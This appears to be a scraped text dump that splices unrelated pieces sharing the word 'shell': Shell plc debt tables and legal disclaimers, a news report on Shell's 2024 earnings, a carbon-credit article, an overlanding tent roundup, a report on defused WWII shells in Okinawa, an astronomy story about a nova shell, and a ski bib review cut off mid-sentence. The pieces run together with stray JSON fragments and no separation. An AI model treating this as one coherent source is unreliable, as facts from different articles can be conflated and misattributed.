ROACE on an Adjusted Earnings plus NCI basis 11.3% 12.8% 12.8%\n\n\n\n\n\nE. Net debt and gearing\n\nNet debt is defined as the sum of current and non-current debt, less cash and cash equivalents, adjusted for the fair value of derivative financial instruments used to hedge foreign exchange and interest rate risk relating to debt, and associated collateral balances. Management considers this adjustment useful because it reduces the volatility of net debt caused by fluctuations in foreign exchange and interest rates, and eliminates the potential impact of related collateral payments or receipts. Debt-related derivative financial instruments are a subset of the derivative financial instrument assets and liabilities presented on the balance sheet. Collateral balances are reported under \u201cTrade and other receivables\u201d or \u201cTrade and other payables\u201d as appropriate.\n\nGearing is a measure of Shell's capital structure and is defined as net debt (total debt less cash and cash equivalents) as a percentage of total capital (net debt plus total equity).\n\n$ million December 31, 2024 September 30, 2024 December 31, 2023 Current debt 11,630 12,015 9,931 Non-current debt 65,448 64,597 71,610 Total debt 77,078 76,613 81,541 Of which lease liabilities 28,702 25,590 27,709 Add: Debt-related derivative financial instruments: net liability/(asset) 2,469 1,694 1,835 Add: Collateral on debt-related derivatives: net liability/(asset) (1,628) (821) (1,060) Less: Cash and cash equivalents (39,110) (42,252) (38,774) Net debt 38,809 35,234 43,542 Total equity 180,165 189,538 188,362 Total capital 218,974 224,772 231,902 Gearing 17.7 % 15.7 % 18.8 %\n\n\n\n\n\n\n\n\n\nF.

Brandon Bell | Getty Images News | Getty Images\n\nBritish oil giant Shell on Thursday reported a significant drop in annual profit, citing higher exploration write-offs, lower trading margins and weaker crude prices over the final three months of the year. Shell posted adjusted earnings of $23.72 billion for the full-year 2024, compared to annual profit of $28.25 billion a year earlier. Analysts had expected Shell's full-year 2024 net profit to come in at $24.71 billion, according to an LSEG-compiled consensus. A separate forecast from analysts polled by Vara Research expected full-year profit to come in at $24.11 billion. The energy major posted weaker-than-anticipated adjusted earnings of $3.66 billion for the final quarter of 2024. Shell announced a 4% increase in dividend per share and launched another share buyback program of $3.5 billion, which is expected to be completed over the next three months.\n\nwatch now\n\nSpeaking to CNBC's \"Squawk Box Europe\" on Thursday, Shell CEO Wael Sawan described 2024 as a \"very strong year,\" one which gave the company a platform \"to do everything we said we were going to do.\" Asked whether it was time for Shell to move its listing from London to New York to close the valuation gap on its U.S. peers, Sawan said the firm was \"always reviewing headquarter listings and the like.\" However, \"there is no live discussion at the moment on this in Shell because our number one priority is to make sure that we unlock the full potential of this company,\" Sawan noted. Shares of the London-listed company closed almost 3% higher Thursday. Other earnings highlights: Full-year cash flow from operating activities came in at $54.68 billion, beating analyst expectations\n\nNet debt at the end of 2024 was $4.7 billion lower than at the beginning of the year The world's top oil and gas companies have seen profits fall from record levels in 2022, when Russia's full-scale invasion of Ukraine prompted international benchmark Brent crude to jump to nearly $140 a barrel. Oil prices have since cooled amid faltering global demand, with Brent crude futures averaging $80 a barrel in 2024. That was about $2 a barrel less than the previous year, according to the U.S. Energy Information Administration. In a trading update on Jan. 8, Shell trimmed its liquefied natural gas (LNG) production outlook for the final three months of 2024 and warned that trading results for its chemicals and oil products division were expected to be \"significantly lower\" on a quarterly basis.\n\nShell's full-year results come as the company enters the final stretch of its so-called \"first sprint.\" The strategy, which was launched in 2023 and runs to the end of this year, aims to close the valuation gap with U.S. peers by boosting the major's profitability. Shell CEO Wael Sawan has prioritized the firm's more profitable oil and gas operations as part of this shift, while cutting spending on areas such as offshore wind and hydrogen and withdrawing from power markets in Europe and China. Like other oil and gas majors, Shell has watered down climate targets and green investments in recent years. The company, however, has said it remains committed to becoming a net-zero energy business by 2050.\n\nOil storage silos beyond waterlogged land at the Shell Plc Pernis refinery in Rotterdam, Netherlands, on Sunday, Feb. 11, 2024. Bloomberg | Bloomberg | Getty Images\n\nAnalysts led by Biraj Borkhataria at RBC Capital Markets said Shell's results confirmed \"relatively soft\" expectations but showed robust cash generation. \"Given expectations had fallen following the trading update, we see these results as largely uneventful,\" Borkhataria said in a research note. Separately, Maurizio Carulli, an energy analyst at Quilter Cheviot, said Shell's fourth-quarter results painted a \"mixed picture.\" \"While earnings fell below expectations, the company's cash flow performance exceeded consensus estimates,\" Carulli said. \"Seasonal factors, alongside lower prices and margins, impacted earnings negatively. However, these concerns are mitigated by Shell's robust cash flow generation,\" he added. U.S oil giants Exxon Mobil and Chevron are both scheduled to report earnings on Friday, while European peers TotalEnergies and BP are set to follow suit on Feb. 5 and Feb. 11, respectively.\n\nCourt ruling",

In this media release \"Shell\", \"Shell Group\" and \"Group\" are sometimes used for convenience where references are made to Shell plc and its subsidiaries in general.

Post deal completion, Shell will have a 20 per cent interest in the Scotford upgrader and Quest CCS facility and will fully exit AOSP's mining operations.\n\nStory Continues\n\nForward-looking Statements\n\nThis media release contains forward-looking statements (within the meaning of the U.S. Private Securities Litigation Reform Act of 1995) concerning the financial condition, results of operations and businesses of Shell. All statements other than statements of historical fact are, or may be deemed to be, forward-looking statements. Forward-looking statements are statements of future expectations that are based on management's current expectations and assumptions and involve known and unknown risks and uncertainties that could cause actual results, performance or events to differ materially from those expressed or implied in these statements. Forward-looking statements include, among other things, statements concerning the potential exposure of Shell to market risks and statements expressing management's expectations, beliefs, estimates, forecasts, projections and assumptions. These forward-looking statements are identified by their use of terms and phrases such as \"aim\"; \"ambition\"; ''anticipate''; ''believe''; \"commit\"; \"commitment\"; ''could''; ''estimate''; ''expect''; ''goals''; ''intend''; ''may''; \"milestones\"; ''objectives''; ''outlook''; ''plan''; ''probably''; ''project''; ''risks''; \"schedule\"; ''seek''; ''should''; ''target''; ''will''; \"would\" and similar terms and phrases. There are a number of factors that could affect the future operations of Shell and could cause those results to differ materially from those expressed in the forward-looking statements included in this media release, including (without limitation): (a) price fluctuations in crude oil and natural gas; (b) changes in demand for Shell's products; (c) currency fluctuations; (d) drilling and production results; (e) reserves estimates; (f) loss of market share and industry competition; (g) environmental and physical risks; (h) risks associated with the identification of suitable potential acquisition properties and targets, and successful negotiation and completion of such transactions; (i) the risk of doing business in developing countries and countries subject to international sanctions; (j) legislative, judicial, fiscal and regulatory developments including regulatory measures addressing climate change; (k) economic and financial market conditions in various countries and regions; (l) political risks, including the risks of expropriation and renegotiation of the terms of contracts with governmental entities, delays or advancements in the approval of projects and delays in the reimbursement for shared costs; (m) risks associated with the impact of pandemics, such as the COVID-19 (coronavirus) outbreak, regional conflicts, such as the Russia-Ukraine war, and a significant cybersecurity breach; and (n) changes in trading conditions. No assurance is provided that future dividend payments will match or exceed previous dividend payments. All forward-looking statements contained in this media release are expressly qualified in their entirety by the cautionary statements contained or referred to in this section. Readers should not place undue reliance on forward-looking statements. Additional risk factors that may affect future results are contained in Shell plc's Form 20-F for the year ended December 31, 2023 (available at www.shell.com/investors/news-and-filings/sec-filings.html and www.sec.gov). These risk factors also expressly qualify all forward-looking statements contained in this media release and should be considered by the reader. Each forward-looking statement speaks only as of the date of this media release, January 29, 2025. Neither Shell plc nor any of its subsidiaries undertake any obligation to publicly update or revise any forward-looking statement as a result of new information, future events or other information. In light of these risks, results could differ materially from those stated, implied or inferred from the forward-looking statements contained in this media release.\n\nShell's Net Carbon Intensity\n\nAlso, in this media release we may refer to Shell's \"Net Carbon Intensity\" (NCI), which includes Shell's carbon emissions from the production of our energy products, our suppliers' carbon emissions in supplying energy for that production and our customers' carbon emissions associated with their use of the energy products we sell. Shell's NCI also includes the emissions associated with the production and use of energy products produced by others which Shell purchases for resale. Shell only controls its own emissions. The use of the terms Shell's \"Net Carbon Intensity\" or NCI are for convenience only and not intended to suggest these emissions are those of Shell plc or its subsidiaries.\n\nShell's net-zero emissions target\n\nShell's operating plan, outlook and budgets are forecasted for a ten-year period and are updated every year. They reflect the current economic environment and what we can reasonably expect to see over the next ten years. Accordingly, they reflect our Scope 1, Scope 2 and NCI targets over the next ten years. However, Shell's operating plans cannot reflect our 2050 net-zero emissions target, as this target is currently outside our planning period. In the future, as society moves towards net-zero emissions, we expect Shell's operating plans to reflect this movement. However, if society is not net zero in 2050, as of today, there would be significant risk that Shell may not meet this target.\n\nForward-looking non-GAAP measures\n\nThis media release may contain certain forward-looking non-GAAP measures such as cash capital expenditure and divestments. We are unable to provide a reconciliation of these forward-looking non-GAAP measures to the most comparable GAAP financial measures because certain information needed to reconcile those non-GAAP measures to the most comparable GAAP financial measures is dependent on future events some of which are outside the control of Shell, such as oil and gas prices, interest rates and exchange rates. Moreover, estimating such GAAP measures with the required precision necessary to provide a meaningful reconciliation is extremely difficult and could not be accomplished without unreasonable effort. Non-GAAP measures in respect of future periods which cannot be reconciled to the most comparable GAAP financial measure are calculated in a manner which is consistent with the accounting policies applied in Shell plc's consolidated financial statements.\n\nThe contents of websites referred to in this announcement do not form part of this announcement.\n\nWe may have used certain terms, such as resources, in this media release that the United States Securities and Exchange Commission (SEC) strictly prohibits us from including in our filings with the SEC. Investors are urged to consider closely the disclosure in our Form 20-F, File No 1-32575, available on the SEC website www.sec.gov.\n\nSOURCE Shell\n\nCision\n\nView original content to download multimedia: http://www.newswire.ca/en/releases/archive/January2025/29/c7480.html",

            "content": "A tent is a big part of any camping trip, and they\u2019re even more important on an overland trip where an equipment failure can mean you\u2019re miles away from adequate shelter. That\u2019s why we\u2019ve rounded up the best tents for overlanding that we can find. We\u2019ve tested many of these tents firsthand, and the rest have been checked out by our staff at Overland Expo events around the country. Each tent is from a trusted manufacturer, and our team wouldn\u2019t hesitate to take these tents out for a weekend or a month-long expedition. So, from rooftop tents to ground tents and from the svelte to the heavy-duty, here are our choices for the best tents for overlanding.\n\nOur Favorite Overlanding Tents\n\nAlu Cab \u2014 3R Expedition Rooftop Tent\n\nPhoto by Rick Stowe\n\nThe 3R Expedition is the latest rendition of a wedge-style stent from Alu Cab. It\u2019s feature-packed and built for the long haul. Not only is it an excellent shelter in all conditions, but the 3R Expedition is supported by a host of accessories, including a direct mount 270-degree awning, a similar shower cube, a drop-down interior table, and even a mattress frame that transforms into a couch. If you want to learn more about this bomb-proof tent that will serve you in the backcountry for years to come, you can read our full review here.\n\nMSRP: $4,399\n\nFreespirit Recreation \u2014 Evolution 2\n\nPhoto by Chris Bradley\n\nThe FSR Evolution V2 is a premium rooftop tent that has earned its place in the upper echelon of hardshell RTT options. Its thoughtful design, high-quality construction, and four-season performance make it stand out in a time when overlanders have such a wide variety of options in the market. Read our full review here.\n\nMSRP: $4,095\n\nFreespirit Recreation \u2014 Odyssey\n\nPhoto by Overland Expo\n\nFreespirit Recreation\u2019s (FSR) Odyssey aluminum hard-shell rooftop tent is a slim, crossbar-capable, and side-hinged clamshell rooftop tent. It boasts a relatively low weight at 134 pounds, despite its impressive spec sheet. Although we found it easy to use and rugged, we did feel it could benefit from slightly smoother operating hardware and a comfier mattress. That said, for those wanting a slim, light, roomy, and utility-rich aluminum hard-shell rooftop tent, the Odyssey is hard to beat. You can read our full review here.\n\nMSRP: $3,295\n\nOZTENT \u2014 RV-3\n\nPhoto by Nick Jaynes\n\nOZTENT\u2019s RV-3 tent sets up in 30 seconds (no, really), packs down nearly as fast, and can withstand 50-mile-per-hour winds. These bona fides make it one of the best ground tents I\u2019ve ever tested. It has a great design. We tested the OZTENT RV-3 over four overlanding trips now and have become absolutely smitten with the thing \u2014 especially for winter camping. It is rated at sleeping three to four people, and it may. All we know is that it has enough room for an extra-long cot, which is essential for tall overlanders, plus two or so feet of space for standing and dressing. And it\u2019s a pleasure to use. In fact, it might be the best ground tent for winter camping we have ever encountered. Read our full review here.\n\nMSRP: $999\n\nRoofnest \u2014 Condor Overland\n\nPhoto by Roofnest\n\nThe Condor Overland from Roofnest takes the hybrid rooftop tent design to the next level providing a compact package when closed but a roomy and comfortable space when deployed. The aluminum shell not only keeps the tent protected, but also offers mounting points for tools and other accessories. Read our full review here.\n\nMSRP: $3,745\n\nREAD MORE: The Best Overlanding Deals of the Week\n\nHonorable Mentions Best Overlanding Tents\n\nAlu-Cab \u2014 LT50 Lightweight Tent\n\nPhoto by OK4WD\n\nPlenty of overlanders adventure in vehicles that might not be rated for heavier rooftop tents, but that doesn\u2019t mean they don\u2019t have options. The LT50 Lightweight Tent from Alu Cab is perfect for station wagons, smaller SUVs, or just overlanders looking to remain weight-conscious while outfitting their rig. While it\u2019s lightweight at only 110 pounds, it doesn\u2019t skimp on features. You can still store your bedding inside, with optional load bars and a perimeter track that\u2019s great for mounting awnings and other accessories. If you\u2019re looking for a lightweight but far from minimalist tent, the Alu-Cab LT50 is a great option.\n\nMSRP: $2,699\n\nGazelle \u2014 T4 Hub Tent\n\nPhoto by Gazelle\n\nIf you\u2019ve been to an Overland Expo or even driven by some popular campsites, there\u2019s a great chance you\u2019ve noticed the green and orange dome-style tents that are common amongst overlanders. The Hub series from Gazelle are quick to set up and break down. You can literally go from unzipping the bag to inside the tent within a minute. We prefer the T4 size, which measures 94\u00d794 inches and has a peak height of 76 inches. With the Gazelle T4, you can set up camp, explore your rig all day, and come back to a roomy backcountry abode in the evening.\n\nMSRP: $399.95\n\niKamper \u2014 SkyCamp Mini 3.0\n\nPhoto by iKamper\n\nFor those of you who\u2019ve heard of \u2014 or seen \u2014 the gargantuan iKamper Skycamp but worried it was too big for your rig, iKamper has a new option for you: The Skycamp Mini 3.0. Just like the hard-shell foldout Skycamp, the mini expands off the passenger side of your vehicle. Since it\u2019s smaller, the Skycamp Mini 3.0 only supports two campers. You can also choose the color of your hard-shell top color: Black or Rocky Black.\n\nMSRP: $3,699\n\nRhino Rack \u2014 Roof Top Soft Shell Tent\n\nPhoto by Rhino Rack\n\nRhino Rack is known for making a wide range of innovative roof racks for a wide range of vehicles. Now, they\u2019re bringing that expertise to another facet of overlanding with a range of rooftop tents. The Soft Shell model from Rhino Rack is a great lightweight option with a small footprint when closed but plenty of space for two to sleep. Plus, it utilizes a Rhino Rack mounting system for easy installation, interior LEDs, and exterior boot bags you can trust.\n\nMSRP: $1,799\n\nSea to Summit \u2014 Telos Freestanding Ultralight Tent\n\nNot all overlanding tents have to be on top of the vehicle or the size of small rooms to serve you well in the backcountry. Sea to Summit\u2019s range of Telos Freestanding tents are great options for adventurers who want one tent to do it all, and we mean \u201cdo it all.\u201d They\u2019re lightweight enough for backpacking, and the components even come in multiple bags that make it easy to split up or balance the load in your pack. The Telos line also includes three models with subtle differences for different adventurers, including a Plus series with heavier-duty fabrics and a Telos Bikepacking model that\u2019s perfect for mounting on your bike forks. Regardless of which you choose, you\u2019ll get plenty of room for two or three people in a lightweight but spacious package that\u2019s a great shelter for backpacking, bikepacking, moto camping, and overlanding.\n\nMSRP: Starting at $449",

This is easier than investing in renewable energy solutions, which Shell and BP have scaled back in recent months.\n\nMSCI Carbon Markets data showed that Shell retired as many as 14.9 million credits last year, the Financial Times reports. Shell\u2019s offsets were twice as many as those of the next energy company on the list, Italy\u2019s Eni.\n\nShell also led in separate data analysis from Allied Offsets, whose recent report showed that the oil and gas supermajor retired nearly three times more carbon credits than the second-largest player on the voluntary carbon market, Microsoft.\n\nThe size of the global carbon credit market remained frozen last year, at around $1.4 billion, MSCI Carbon Markets said earlier this month.\n\nCredit demand, that is credit retirements, was pretty much flat over 2023 while average spot prices fell 20%.\n\nAs of the end of 2024, there were more than 6,200 carbon projects registered across the 12 largest international crediting registries, MSCI Carbon Markets said.\n\nA total of 180 million tons of CO2e of these credits were \u201cretired\u201d last year, which means that they were permanently removed from the market, typically because a corporation has voluntarily used them as part of their climate strategy.\n\nMSCI Carbon Markets analysts see some signs of a coming thaw on the market, such as the continuing rise in the number of companies setting ambitious climate commitments and a number of positive policy and market developments.\n\nBy Tsvetana Paraskova for Oilprice.com\n\nMore Top Reads From Oilprice.com",

Traffic was not restricted.\n\nThe evacuation and restrictions were lifted at 11:02 a.m., the spokesman said.\n\nJapan coast guard and fire department officials kept watch from the surrounding waters, according to the release.\n\nThe 5-inch shell was found Dec. 5, 2023, near Churasan beach in Tomigusuku city, an Itoman city spokesman said by phone Tuesday.\n\nFour 3-inch shells and one 4-inch shell were found Feb. 11 near Ejina Island. The fifth 3-inch shell and the white phosphorous shell were found July 14 near Okaha island in Itoman, the spokesman said.\n\nHe declined to provide details on how they were found.\n\nSome Japanese government officials speak to the press only on condition of anonymity.\n\nLast week, Japanese troops removed and defused a 5-inch, U.S.-made WWII shell found in November at a construction site in the Matsuyama district of Naha city. Another 5-inch, U.S.-made shell found in October was removed from the Uebaru district and defused in December.\n\nThe Japanese government has ramped up searches for unexploded ordnance at airports across the country. The government began surveys in October at Miyazaki Airport on Kyushu, the southernmost of Japan\u2019s four main islands, after a WWII-era bomb exploded that month on a taxiway.\n\nMagnetic surveys began in December at Naha Airport, along with airports in Sendai, Matsuyama and Fukuoka.\n\nCrews disposed of nearly 22 tons of unexploded ordnance leftover from WWII on Okinawa between April 1, 2023, and March 31.\n\nStars and Stripes reporter Keishi Koja contributed to this report.",

Editors have highlighted the following attributes while ensuring the content's credibility:\n\nBandpass image centered at the position of V1425 Aql, showing the extension of the nova shell. Credit: arXiv (2025). DOI: 10.48550/arxiv.2501.09780\n\nUsing the Very Large Telescope (VLT), Chilean astronomers have observed a cataclysmic variable known as V1425 Aql. As a result, they have found that this system hosts an arc-shaped nova shell. The finding is presented in a research paper published on the arXiv preprint server.\n\nCataclysmic variables (CVs) are binary star systems consisting of a white dwarf accreting material from a normal star companion. They irregularly increase in brightness by a large factor, then drop back down to a quiescent state. Dwarf novae (DNe), or U Geminorum variables, are the most populous subtype of CVs and show frequent and dramatic outbursts of typically 2\u20138 mag.\n\nPolars are a subclass of cataclysmic variables distinguished from other CVs by the presence of a very strong magnetic field in their white dwarfs. In some CVs, accretion occurs through a truncated accretion disk when the white dwarf is moderately magnetic. These systems are known as intermediate polars (IPs).\n\nV1425 Aql is a DN whose nova eruption was observed in February 1995, when it reached a maximum brightness of 8.0 mag. Subsequent observations of V1425 Aql after the eruption detected two strong periodicities, one at 6.14 hours, and a second at 1.44 hours, which were attributed to the orbital motion and to the spin of the white dwarf, respectively. This suggests that the system is likely an intermediate polar hosting a weak magnetic white dwarf.\n\nHowever, more recent studies of V1425 Aql were not able to detect any X-ray emissions coming from the system, putting the magnetic nature of the white dwarf into question. Moreover, it was found that the system has a peculiar nova shell, which is a remnant of a nova eruption in a CV. This shell deviates from other features of this type as it consists of at least two different components: an inner symmetric shell, and an outer asymmetric shell. The outer shell appears to be expanding faster than the inner one.\n\nTherefore, in order to shed more light on the properties and origin of the unusual nova shell in V1425 Aql, a team of astronomers led by Lientur Celed\u00f3n of the University of Valpara\u00edso in Chile decided to investigate this system using VLT's Multi-Unit Spectrograph Explorer (MUSE), which is an integral field spectrograph.\n\nMUSE observations found that the outer shell has an arc-shaped structure that partially encircles the inner shell, which is more spherical. Such a structure is unexpected, as nova shells usually showcase cone or plume geometry.\n\nFurthermore, the observations detected Balmer, oxygen, nitrogen, and helium emission lines in the spectra of V1425 Aql's nova shell. It turned out that the outer ejecta is only visible in the so-called forbidden lines, while the inner shell shows a mix between allowed and forbidden transitions.\n\nThe analysis of the collected spectra revealed clumpy structures within the shell, which may appear to share the same axes in the sky as the outer ejecta. However, further observations are required in order to confirm this, and as the shell expands, these clumps should be more evident.\n\nTrying to explain the origin of the unusual structure of the nova shell in V1425 Aql, the authors of the paper assume that a magnetic white dwarf may be the reason behind it. However, given that the magnetic nature of the white dwarf in this system is unconfirmed, they cannot draw final conclusions about the true mechanism responsible for the observed shell geometry.\n\nMore information: L. Celed\u00f3n et al, MUSE observations of V1425 Aql reveal an arc-shaped nova shell, arXiv (2025). DOI: 10.48550/arxiv.2501.09780 Journal information: arXiv\n\n\u00a9 2025 Science X Network",

            "content": "Helly Hansen is a leader in the ski apparel market, and their Ridge Infinity kit was quick to impress us throughout a full season of testing last winter. Along with the jacket, we put the bibs through their paces in eastern Washington and came away with high praise regarding wet-weather protection and durability. Wind resistance was a little lacking (something we didn\u2019t experience with the jacket), and we did have some fit and finish-related issues, but overall, the Ridge Infinity Shell Bibs are a quality option for mixed resort and backcountry use. Below we break down our experiences with the Ridge Infinity Bibs. To see how they stack up to the competition, check out our article on the best ski bibs. And to complete your kit, we\u2019ve also tested and reviewed the Ridge Infinity Shell Jacket.\n\n\n\nTable of Contents\n\n\n\nPerformance\n\nWeather Protection\n\nBoasting Helly Hansen's top-end Helly Tech Professional membrane, the Ridge Infinity Shell Bibs performed admirably in the wet conditions I encountered in eastern Washington. Combined with a durable water-repellent (DWR) coating and fully seam-sealed construction, the bibs did an excellent job repelling moisture and keeping me dry throughout the season. My only notable complaint is that the bibs didn't block wind as effectively as I expected from a premium 3-layer design. The fabric felt noticeably thinner than burlier options like Flylow Gear\u2019s Baker Bib, which was particularly evident at Mission Ridge Resort\u2014a ski area notorious for wind. It's worth noting that the Ridge Infinity Shell Jacket that I tested alongside the bibs performed well in blustery weather, so I was very surprised to find the bibs lacking in this department.\n\n\n\nThe Ridge Infinity Bibs' 3-layer design and DWR coating performed well in wet conditions | Credit: Jason Hummel\n\nThat said, I do appreciate the bibs' high level of coverage. The design extends pretty high up the chest, effectively preventing snow from sneaking in overtop, and the integrated gaiters did a great job sealing out moisture around my boots. My only concern was the cargo pocket on the left thigh, which uses a Velcro-equipped flap closure instead of a more secure zipper (more in \"Key Features\" below). However, despite my reservations, the pocket remained snow-free even during deep powder days. Additionally, the bibs are compatible with Helly Hansen\u2019s powder skirts (as seen on the matching Ridge Infinity Shell Jacket that I tested) for the utmost security on deep days and in the event of a fall.\n\n\n\nThe Ridge Infinity Bibs come well equipped for sealing out snow | Credit: Jason Hummel\n\nBreathability\n\nThe flip side to subpar wind resistance is that the Ridge Infinity Bibs breathed better than expected. While I wouldn't recommend them as a dedicated touring companion\u2014the thinner and more air-permeable Outdoor Research Skytour AscentShell Bibs take the cake as our favorite backcountry design\u2014the Ridge proved plenty breathable for sidecountry hikes. To help with airflow, Helly Hansen included vents at the outside of each thigh. The zipper on the right side opens fully for easy on and off, while the vent on the left is much smaller. This wasn't a dealbreaker for me since I stuck to the resort, but making the left thigh zipper the same size as the right side would certainly improve ventilation for bootpacks and short tours.\n\n\n\nThe left thigh vent is much smaller than the right, resulting in reduced airflow | Credit: Jason Hummel\n\nComfort and Mobility\n\nThe Ridge Infinity Bibs feature 2-way mechanical stretch in the fabric, which makes them exceptionally easy to move in. The thinner construction further enhances maneuverability, while the snug fit around the chest and looser cut through the legs (complete with articulated knees) strike a nice balance between security and freedom of movement. I was particularly impressed with the suspenders, which are wide, flat, and cross comfortably at the center of my back. The straps stayed securely in place throughout full days of skiing, never loosening or slipping off my shoulders. Additionally, those who like riding with a ski backpack will appreciate the thoughtful placement of the suspenders' adjustment buckles on the back rather than at the front or on top of the shoulders, which helps eliminate potential pressure points underneath pack straps.\n\n\n\nThe Ridge Infinity Bibs' wide, well-executed straps contribute to all-around comfort | Credit: Jason Hummel\n\nBuild Quality and Durability\n\nDespite their lightweight feel and relative lack of wind resistance, I found the Ridge Infinity Shell Bibs to be quite durable overall. All of the materials and components have a noticeably high-quality feel, and the bibs are showing no signs of wear after a full season of tree skiing and chairlift rides. The scuff guards at the inside of each cuff are particularly robust, providing excellent protection against sharp equipment like ski edges and ski poles. Additionally, the suspenders have maintained their elasticity throughout testing, staying secure without stretching out or losing their shape. Overall, I have no concerns about the longevity of these bibs\u2014they feel built to last and should serve me well for many seasons to come. Finally, while entirely subjective, I love the bibs' classy styling and subtle branding\u2014there's a logo on the chest that's barely noticeable unless in direct sunlight and a smaller logo on the lower right leg.\n\n\n\nThe Ridge Infinity Bibs have beefy scuff guards for fending off abrasion from sharp equipment | Credit: Jason Hummel\n\nWeight and Packability\n\nWeighing in at 1 pound 9 ounces, the Ridge Infinity Shell Bibs are relatively lightweight for a resort-focused design. For comparison, our favorite overall pick this year is Flylow Gear's Baker Bib, which tips the scales at just over 2 pounds, while the backcountry-ready Outdoor Research Skytour Bibs check in at a similar 1 pound 9.9 ounces. The Ridge Infinity Bibs' lighter weight and thinner fabric also make them fairly packable. While the limited ventilation prevents them from being a top choice for extended backcountry missions, I consider them entirely serviceable for short tours, yo-yo laps, and bootpacks into the sidecountry.\n\n\n\nThe Ridge Infinity Bibs clock in at a competitive 1 pound 9 ounces | Credit: Jason Hummel\n\nKey Features\n\nStorage: Pockets\n\nThe Ridge Infinity Bibs feature three pockets in total: one zippered pocket on the right thigh, a cargo-style pocket with a Velcro closure on the left thigh, and a pass-through pocket with dual zippers at the chest. While not a standout in terms of storage, I found the layout to be entirely functional for resort use. I did find myself wishing for a more traditional horizontal zipper for the chest pocket\u2014the vertical zippers don't inspire confidence when quickly stashing valuables\u2014but I haven't had any issues with items falling out in testing. Further, as I mentioned, the flap-equipped cargo pocket seems more susceptible to moisture than the zippered pocket at the opposite side, but all of my belongings have stayed dry thus far.\n\n\n\nOf the three pockets, the zippered pocket at the right thigh feels the most secure for stashing valuables | Credit: Jason Hummel\n\nAccess\n\nTruth be told, I experienced a bit of a learning curve when pulling on the Ridge Infinity Bibs for the first time. The biggest issue has to do with the suspender design, which connects to the front of the bibs and can make getting in and out tricky when the right vent is fully unzipped. I also found the front fly to be a bit of a letdown due to its small size. This makes bathroom breaks more challenging than they need to be, especially when trying to maneuver through a baselayer. Considering the premium price point of these bibs, I expected a slightly more refined fit and finish.\n\n\n\nThe Ridge Infinity Bibs' short fly made bathroom breaks tricky | Credit: Jason Hummel\n\nRecco Reflector\n\nThe Ridge Infinity Bibs come equipped with a Recco reflector, which is a passive device that transmits your location to search and rescue personnel (like ski patrol). While this feature wasn\u2019t top of mind for me on resort days, even when ducking ropes, it\u2019s nevertheless a reassuring addition for inbounds emergencies. That said, it\u2019s important to note that Recco is not a substitute for proper avalanche safety gear (e.g., beacon, shovel, and probe) when venturing into the backcountry. For a full breakdown of what we bring on out-of-bounds adventures, check out our detailed Backcountry Skiing Checklist.\n\n\n\nThe Ridge Infinity Bibs come with a Recco reflector for added peace of mind | Credit: Jason Hummel\n\nFit and Sizing\n\nAs I mentioned earlier, I\u2019m a big fan of the Ridge Infinity Bibs' freeride-oriented fit. The front half fits snugly around the chest, while the legs are looser, offering both style points and excellent freedom of movement. I tested a men\u2019s size medium (for reference, I\u2019m 5'11\" and weigh 165 lb.) and found the fit to be spot-on with plenty of room to accommodate layering underneath. The cuffs extend over the top of my boots without being excessively long, with a wide flare at the bottom that minimizes restriction. As I covered above, the bibs can be tricky to get on due to the suspender design, but I was very pleased with their overall fit once I got them on.\n\n\n\nThe Ridge Infinity Bibs have a versatile fit that nicely balances mobility and style | Credit: Jason Hummel\n\nSustainability\n\nThe outdoor industry has seen a strong sustainability push in recent years, and we're happy to see that Helly Hansen is on board. In this case, the Ridge Infinity Bibs are constructed with 54%-recycled polyester and boast a PFAS-free DWR coating that forgoes the use of harmful per- and polyfluoroalkyl substances. These \"forever chemicals\" are notorious for their inability to break down over time, and many states are stepping up to ban PFAS given their negative impact on the environment and human health. We'd love to see Helly Hansen make further improvements in the form of bluesign-approved materials and a Fair Trade certification in a future update, but we nevertheless appreciate their ongoing sustainability efforts.\n\n\n\nThe Ridge Infinity Bibs feature a partially recycled shell fabric and PFAS-free DWR coating | Credit: Jason Hummel\n\nOther Versions of the Helly Hansen Ridge Infinity\n\nI covered the men\u2019s Ridge Infinity Bibs for this review, and it's also available in a matching jacket under the same name. For reference, I tested the jacket and bibs side by side last season and found that both delivered reliable protection alongside great durability. The jacket fended off wind better than the bibs, which is likely due to a thicker construction, although it's hard to say for sure since Helly Hansen does not publish a denier specification (a measurement of fabric thickness) for either piece. Rounding out the collection, the Ridge Infinity Shell Pants retail for $500 and share a largely identical construction to the bibs, albeit with less coverage and no suspenders.\n\n\n\nTesting the Ridge Infinity Shell Jacket alongside the matching bibs | Credit: Jason Hummel\n\nWhat We Like\n\nReliably protective in the wet thanks to Helly Hansen's top-end Helly Tech Professional membrane, full seam taping, and excellent coverage.\n\nWell built with high-quality materials and components that stand up well to frequent resort use.\n\nCompetitively light at 1 pound 9 ounces, which is on par with many backcountry-focused designs.\n\nFreeride-oriented fit and subtle branding result in a very stylish, clean look.\n\nBreathes better than the matching Ridge Infinity Shell Jacket, making it a more ideal choice for short tours and trips into the sidecountry.\n\n\n\nWhat We Don\u2019t\n\nNot particularly wind-resistant, which made for some cold chairlift rides at our particularly windy local resort.\n\nVent at the outer left thigh is considerably smaller than the one on the right, resulting in reduced airflow (they wouldn't be our first choice for dedicated backcountry use).\n\nFly is also small and difficult to access, which makes bathroom breaks tricky.\n\nNot the easiest bibs to get on due to the suspender design.\n\n\n\nOpening the vent at the outer right thigh, which is much bigger than the one on the left | Credit: Jason Hummel\n\nComparison Table\n\n\n\nThe Competition\n\nThe Helly Hansen Ridge Infinity is a premium ski bib that crosses over well for mixed resort and backcountry use, but it doesn't come cheap at $600. For a considerable $170 less, Flylow Gear's Baker Bib tops our rankings this year for its class-leading durability and protection in a stylish package. For waterproofing, Flylow went with their 3-layer Surface construction, which we found to be reliably protective and hardwearing in testing. You also get upgraded storage with seven total pockets (compared to the Ridge Infinity's three), although weight goes up to a fairly hefty 2 pounds 1.6 ounces. Combined with the Flylow's roomy, freeride style, we consider the Helly Hansen to be the better backcountry option, but the Flylow does include massive side vents and zippered openings along the inner thigh, which allow you to dump heat on spring days or during the odd bootpack to access sidecountry terrain. In the end, a final decision will come down to how you prioritize weight and breathability (the Ridge Infinity wins out) versus price and durability (the Baker gets the edge).\n\n\n\nThe Ridge Infinity's pass-through pocket lacks the security of a more traditional horizontal opening | Credit: Jason Hummel\n\nTransitioning to a more backcountry-ready design, Outdoor Research\u2019s Skytour AscentShell is hard to beat on heart-pumping objectives. Featuring a hybrid-mapped construction, the Skytour smartly patterns OR's AscentShell fabric along the legs with a stretch-woven softshell bib upper, resulting in a best-of-both worlds combination of protection, breathability, and comfort. Other advantages include price and storage, with the Skytour checking in around $170 less than the Ridge Infinity and boasting an additional pocket. The biggest trade-offs are 